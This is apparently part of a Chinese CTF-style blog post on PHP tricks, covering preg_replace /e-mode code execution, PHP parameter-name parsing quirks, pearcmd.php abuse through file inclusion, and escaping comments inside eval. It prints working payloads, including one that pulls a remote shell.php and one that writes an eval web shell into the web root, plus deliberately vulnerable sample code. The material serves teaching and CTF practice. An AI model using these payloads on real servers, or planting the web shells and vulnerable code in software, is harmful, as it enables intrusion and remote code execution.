+<p>其实这里的漏洞很简单，如果<strong>preg_replace</strong> 使用了 <strong>&#x2F;e</strong> 模式，就可以导致代码执行，当使用了&#x2F;e模式的时候，<strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串当成代码去执行，</p>
+<p>举个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$regex</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$regex</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为这里第一个和第三个参数都是我们可控的，我们也知道了preg_replace匹配到符号正则的字符串时，会将替换字符串当成代码去执行，但是因为这里第二个参数是固定的，此时我们应该怎么执行代码呢？</p>
+<p>在参数2中，我们可以看到有<code>\1</code>，其实<code>\1</code>在这个函数中是有含义的，<code>\1</code> 是 <strong>反向引用</strong>，指代正则中的第1个捕获组。</p>
+<h2 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h2><p>如果在正则表达式两边添加括号，那么就会导致相关的<strong>匹配存储到一个临时的缓冲区</strong>，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
+<p><img src="/../image/achieve/202411/XYCTF2024/image-20250403161315817.png" alt="image-20250403161315817"></p>
+<p>所以实际上这里就是匹配第一个子匹配项，可能现在还不能理解，先拿payload去讲解吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：/?.*=&#123;$&#123;phpinfo()&#125;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>那么结果就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $regex . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $value);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>本身这个payload是可以实现的，但是因为这是在GET传参，PHP在处理参数名的时候会将<code>.</code>换成下划线导致无法执行，当非法字符为首字母时，只有点号会被替换成下划线。</p>
+<p>所以我们这里要做的就是让正则匹配能完全匹配到我们的<code>&#123;$&#123;phpinfo()&#125;&#125;</code>，这里师傅给出了一个payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们再解释一下为什么需要匹配到<code>&#123;$&#123;phpinfo()&#125;&#125;</code>才能执行里面的代码，这也是一个小点，其实就是可变变量的原因</p>
+<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403162447924.png" alt="image-20250403162447924"></p>
+<p>所以<strong>在双引号的包裹下，我们的字符串会检查并解析变量，而单引号不会</strong>，**${phpinfo()}** 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(phpinfo());</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">bool(true)</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure>
+
+<p>另外需要注意的是，<strong>在&#x2F;e模式下执行代码的时候会自动转义特殊字符</strong></p>
+<h1 id="PHP中非法变量的解析"><a href="#PHP中非法变量的解析" class="headerlink" title="PHP中非法变量的解析"></a>PHP中非法变量的解析</h1><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250325112657901.png" alt="image-20250325112657901"></p>
+<p>参数名中含有<code>空格</code>和<code>点</code>，可以看到当我们传入<code>?mo yu.=xxx</code>时，传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code>，从而变成mo_yu_这样的参数名确实无法传参</p>
+<p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p>
+<h1 id="pearcmd-php的妙用"><a href="#pearcmd-php的妙用" class="headerlink" title="pearcmd.php的妙用"></a>pearcmd.php的妙用</h1><h2 id="1-register-argc-argv"><a href="#1-register-argc-argv" class="headerlink" title="1. register_argc_argv"></a>1. register_argc_argv</h2><p>如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On</p>
+<p>这个register_argc_argv能干什么呢？</p>
+<p>我们先本地测试一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);<span class="comment">//以数组形式输出我们的命令行参数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//在 CLI 模式 下</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/# php test.php </span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(8) &quot;test.php&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/# php test.php 1 2 3</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(8) &quot;test.php&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(1) &quot;3&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在web页模式下必须在php.ini开启register_argc_argv配置项<br>设置register_argc_argv &#x3D; On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</p>
+<p>然后我们如何利用呢？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>[<span class="number">0</span>](<span class="variable">$a</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不过这个在web下测试更方便，但是不知道为什么这里没测出来，所以直接在CLI下测了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/var/www/html# cat 1.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump($_SERVER[&#x27;argv&#x27;]);</span><br><span class="line">$a = $_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$a[1]($a[2]);</span><br><span class="line">?&gt;</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/var/www/html# php 1.php system ls</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;1.php&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(6) &quot;system&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;ls&quot;</span><br><span class="line">&#125;</span><br><span class="line">1.php</span><br><span class="line">index.nginx-debian.html</span><br><span class="line">upload</span><br><span class="line">xss.php</span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功执行了</p>
+<p>然后我们看pearcmd.php的神奇使用，最好的就是p牛的文章了</p>
+<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250325165314237.png" alt="image-20250325165314237"></p>
+<p>PEAR是为PHP扩展与应用库(PHP Extension and Application Repository)，它是一个PHP扩展及应用的一个代码仓库<br>类似于composer，用于代码的下载与管理。</p>
+<p>pear可以用来拉取远程的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install -R /tmp http://vps/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>该payload可以用来拉取我们vps上的shell.php文件并解析执行</p>
+<h2 id="2-register-argc-argv和pear的关系"><a href="#2-register-argc-argv和pear的关系" class="headerlink" title="2.register_argc_argv和pear的关系"></a>2.register_argc_argv和pear的关系</h2><p><strong>当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell。</strong></p>
+<h2 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h2><p>如果靶机出网</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们尝试拉取远程服务器的shell.php到靶机的&#x2F;tmp目录下</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</span><br><span class="line">//shell就是我们的一句话木马</span><br></pre></td></tr></table></figure>
+
+<p>然后文件包含shell.php同时传参cmd即可</p>
+<p>解释payload</p>
+<ul>
+<li><strong><code>?file=/usr/local/lib/php/pearcmd.php</code></strong><ul>
+<li>指定 <code>pearcmd.php</code> 文件的路径。</li>
+<li><code>pearcmd.php</code> 是 PEAR（PHP 扩展和应用库）的命令行工具。</li>
+</ul>
+</li>
+<li><strong><code>&amp;+install+-R+/tmp+http://vps/shell.php</code></strong><ul>
+<li>这是 <code>pearcmd.php</code> 的 <code>install</code> 命令的参数。</li>
+<li><code>install</code>：安装指定的包。</li>
+<li><code>-R /tmp</code>：将安装的文件保存到 <code>/tmp</code> 目录。</li>
+<li><code>http://vps/shell.php</code>：从远程服务器下载的恶意文件。</li>
+</ul>
+</li>
+</ul>
+<p>如果靶机不出网，我们可以写一句话木马进hello.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[&#x27;shell&#x27;]);?&gt;+/var/www/html/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>解释payload</p>
+<ul>
+<li><strong><code>?+config-create+</code></strong><ul>
+<li>这是 PHP 的 <code>pearcmd.php</code> 工具的一个参数，用于创建配置文件。</li>
+<li><code>pearcmd.php</code> 是 PEAR（PHP 扩展和应用库）的命令行工具。</li>
+</ul>
+</li>
+<li><strong><code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/</code></strong><ul>
+<li>指定 <code>pearcmd.php</code> 文件的路径。</li>
+<li>如果服务器上存在 <code>pearcmd.php</code>，这段代码会尝试调用它。</li>
+</ul>
+</li>
+<li><strong><code>&lt;?=eval($_POST[1])?&gt;</code></strong><ul>
+<li>这是一个 PHP 短标签，用于执行 <code>eval($_POST[1])</code>。</li>
+<li><code>eval</code> 函数会执行传入的 PHP 代码，<code>$_POST[1]</code> 是从 POST 请求中获取的参数。</li>
+<li>这段代码的目的是将恶意 PHP 代码写入目标文件。</li>
+</ul>
+</li>
+<li><strong><code>+/tmp/hello.php</code></strong><ul>
+<li>指定目标文件的路径，即 <code>/tmp/hello.php</code>。</li>
+<li>如果攻击成功，恶意代码会被写入该文件。</li>
+</ul>
+</li>
+</ul>
+<p>后来看了p牛的文章才知道$SERVER并不任务&amp;符号是参数的分隔符，而是将+号作为分隔符</p>
+<h1 id="逃逸eval中注释符"><a href="#逃逸eval中注释符" class="headerlink" title="逃逸eval中注释符"></a>逃逸eval中注释符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>. <span class="variable">$a</span> .<span class="string">&quot;2323&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>从eval中可以看到我们需要处理两个坑点</p>
+<ul>
+<li>前面的<code>#</code>注释符会把后面的代码注释掉</li>
+<li>后面的2323是脏数据，需要处理掉</li>
+</ul>
+<p>后面的脏数据其实很好处理，我们在传入参数的结尾加上注释就可以，问题是如何绕过前面的注释符让我们的代码生效</p>
+<p>我们可以用换行符(<code>\n</code>)</p>
+<p>例如我们传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\necho &#x27;1&#x27;;#</span><br></pre></td></tr></table></figure>
+
+<p>因为eval函数会把括号中的内容当成php代码去拼接在语句中。所以理论上如果我们传入换行符就会变成这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#\n</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>;<span class="comment">#2323</span></span><br></pre></td></tr></table></figure>
+
+<p>此时成功逃逸注释，我们便可以传入想要传入的代码</p>
+<p>但是需要注意的是</p>
+<ul>
+<li><p>注意# 是 URL 的锚点标识符，这里需要对#进行编码成%23，否则会被认为是URL本身的分隔符，</p>
+</li>
+<li><p>根据**<code>\n</code> 和 <code>\r</code> 在 HTTP 请求中的特殊作用**，如果 <code>\n</code> 不经编码直接传入 <code>?a=\n123</code>，服务器或浏览器可能会错误地认为 <code>\n</code> 是 <strong>HTTP 请求结束符</strong>，导致参数被截断。所以我们的<code>\n</code>也是需要编码成URL编码才能起作用的</p>
+</li>
+</ul>
+<p>所以最终我们需要传入的payload是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=%0aecho &#x27;1&#x27;;%23</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">wanTh3flag</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/03/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/">http://example.com/2025/04/03/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">root@wanth3f1ag</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php%E5%B0%8F%E6%8A%80%E5%B7%A7/">php小技巧</a></div><div class="post-share"><div class="social-share" data-image="/image/8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/03/XYCTF2024%E5%A4%8D%E7%8E%B0/" title="XYCTF2024复现"><img class="cover" src="/image/8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">XYCTF2024复现</div></div><div class="info-2"><div class="info-item-1">ezMake扫了一下目录发现有flag文件，下载下来就是flag，不过好像这不是预期解  传入一个1之后有回显  分析一下内容 这里PATH变量被设置为空，这段 Makefile 的逻辑检查了 PATH 是否未定义，如果未定义则设为空，如果已定义也重设为空。因为**make 命令本身也依赖 PATH 查找**，当PATH被设置为空之后，  但是测试之后发现Bash内置命令是可以执行的  内置命令列表     命令 说明    : 扩展参数列表，执行重定向操作   . 读取并执行指定文件中的命令（在当前 shell 环境中）   alias 为指定命令定义一个别名   bg 将作业以后台模式运行   bind 将键盘序列绑定到一个 readline 函数或宏   break 退出 for、while、select 或 until 循环   builtin 执行指定的 shell 内建命令   caller 返回活动子函数调用的上下文   cd 将当前目录切换为指定的目录   command 执行指定的命令，无需进行通常的 shell...</div></div></div></a><a class="pagination-related" href="/2025/04/02/java%E4%BB%8E0%E5%88%B01%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="java从0到1的学习"><img class="cover" src="/image/8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java从0到1的学习</div></div><div class="info-2"><div class="info-item-1">基础知识先讲讲Java语言的几个重要特性  Java语言是面向对象的语言(oop) Java语言是健壮的，Java 的强类型机制、异常处理、垃圾的自动收集等是 Java 程序健壮性的重要保证。 Java语言是跨平台型的语言 Java语言是强类型的语言 Java语言是解释型语言 解释型语言:javascript,PHP,java 编译性语言:C&#x2F;C++  什么是解释性语言？就是编译后的代码不能直接被机器执行的，需要解释器去执行 一个 Java 程序可以认为是一系列对象的集合，而这些对象通过调用彼此的方法来协同工作。 程序员的第一个程序必然就是hello world了，那我们先拿这个代码来分析一下 12345678public class HelloWorld &#123;    /* 我的第一个Java程序     * 它将输出字符串 Hello World     */    public static void main(String[] args) &#123;        System.out.println(&quot;Hello World&quot;);...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">wanTh3flag</div><div class="author-info-description">web低手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">舒适圈是温柔的陷阱，挑战区才是真正的成长。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Emd5%E5%92%8Csha1%E7%BB%95%E8%BF%87"><span class="toc-text">关于md5和sha1绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-text">1.数组绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-0e%E7%BB%95%E8%BF%87"><span class="toc-text">2.0e绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%8C%E9%87%8Dmd5%E4%B8%8B%E7%9A%840e%E7%BB%95%E8%BF%87"><span class="toc-text">3.双重md5下的0e绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-md5%E7%BB%95%E8%BF%87SQL"><span class="toc-text">4.md5绕过SQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-md5-sha1-%E5%8A%A0%E5%AF%86%E5%90%8E%E5%BC%B1%E7%AD%89%E4%BA%8E%E5%88%9D%E5%A7%8B%E5%80%BC"><span class="toc-text">5.md5(sha1)加密后弱等于初始值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%9B%BE%E7%89%87%E6%96%87%E6%9C%AC%E5%BC%BA%E7%A2%B0%E6%92%9E%E7%BB%95%E8%BF%87"><span class="toc-text">6.图片文本强碰撞绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-text">intval()函数漏洞绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFintval-%EF%BC%9F"><span class="toc-text">什么是intval()？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-text">绕过思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Epreg-match-%E7%BB%95%E8%BF%87"><span class="toc-text">关于preg_match()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpreg-match%EF%BC%9F"><span class="toc-text">什么是preg_match？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">PHP利用PCRE回溯次数限制绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E5%BC%95%E6%93%8E"><span class="toc-text">正则引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E6%BA%AF%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-text">回溯的过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPHP%E7%9A%84pcre-backtrack-limit%E9%99%90%E5%88%B6%E5%88%A9%E7%94%A8"><span class="toc-text">关于PHP的pcre.backtrack_limit限制利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#preg-replace-e-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84RCE"><span class="toc-text">preg_replace &#x2F;e 模式下的RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpreg-replace-%E5%87%BD%E6%95%B0%EF%BC%9F"><span class="toc-text">什么是preg_replace()函数？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E5%BC%95%E7%94%A8"><span class="toc-text">反向引用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%B8%AD%E9%9D%9E%E6%B3%95%E5%8F%98%E9%87%8F%E7%9A%84%E8%A7%A3%E6%9E%90"><span class="toc-text">PHP中非法变量的解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pearcmd-php%E7%9A%84%E5%A6%99%E7%94%A8"><span class="toc-text">pearcmd.php的妙用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-register-argc-argv"><span class="toc-text">1. register_argc_argv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-register-argc-argv%E5%92%8Cpear%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-text">2.register_argc_argv和pear的关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-payload"><span class="toc-text">3.payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%83%E9%80%B8eval%E4%B8%AD%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-text">逃逸eval中注释符</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/07/%E5%95%86%E4%B8%98CTF/" title="商丘CTF">商丘CTF</a><time datetime="2025-04-07T02:02:10.000Z" title="发表于 2025-04-07 10:02:10">2025-04-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/04/XYCTF2025/" title="XYCTF2025">XYCTF2025</a><time datetime="2025-04-04T02:05:41.000Z" title="发表于 2025-04-04 10:05:41">2025-04-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/" title="对于RCE和文件包含的一点总结">对于RCE和文件包含的一点总结</a><time datetime="2025-04-03T11:27:31.000Z" title="发表于 2025-04-03 19:27:31">2025-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/XYCTF2024%E5%A4%8D%E7%8E%B0/" title="XYCTF2024复现">XYCTF2024复现</a><time datetime="2025-04-03T11:27:19.000Z" title="发表于 2025-04-03 19:27:19">2025-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/" title="PHP的一些小技巧">PHP的一些小技巧</a><time datetime="2025-04-03T07:37:51.000Z" title="发表于 2025-04-03 15:37:51">2025-04-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/image/8.jpg);"><div id="footer-wrap"><div 